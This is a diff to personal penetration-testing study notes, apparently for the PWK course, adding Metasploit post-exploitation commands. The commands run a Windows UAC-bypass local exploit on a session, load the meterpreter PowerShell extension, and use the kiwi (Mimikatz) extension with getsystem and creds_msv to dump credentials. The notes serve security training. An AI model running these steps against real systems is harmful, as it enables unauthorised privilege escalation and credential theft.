@@ -2799,7 +2799,38 @@ meterpreter > migrate 3568
     #+end_src
       - migrate target can only be the other process at the same or lower privilege level.
         
-*** Post-Exploitation Modules
+*** Post-Exploitation Modules (PWK 713)
+    + find the module that works with the target Windows version.
+    + in the example =bypassuac_injection_winsxs=
+    + src:
+    #+begin_src msf
+    msf5 > use exploit/windows/local/bypassuac_injection_winsxs
+    msf5 exploit(windows/local/bypassuac_injection_winsxs) > show options
+    msf5 exploit(windows/local/bypassuac_injection_winsxs) > set SESSION 10
+    msf5 exploit(windows/local/bypassuac_injection_winsxs) > run
+      # run on meterpreter session 10
+    #+end_src
+    
+**** the meterpreter PowerShell extension
+     + ref:
+       - [[https://www.darkoperator.com/blog/2016/4/2/meterpreter-new-windows-powershell-extension][the meterpreter PowerShell extension]]
+     + src:
+     #+begin_src meterpreter
+     meterpreter > load powershell
+     meterpreter > help powershell
+     meterpreter > powershell_execute "$PSVersionTable.PSVersion"
+     #+end_src
+
+**** the meterpreter Mimikatz extension
+     + src:
+     #+begin_src meterpreter
+     meterpreter > load kiwi
+     meterpreter > help kiwi
+     meterpreter > getsystem
+     meterpreter > creds_msv
+     #+end_src
+     
+*** Pivoting with the Metasploit Framework
 
 * TODO list
   + AD, LDAP enum users
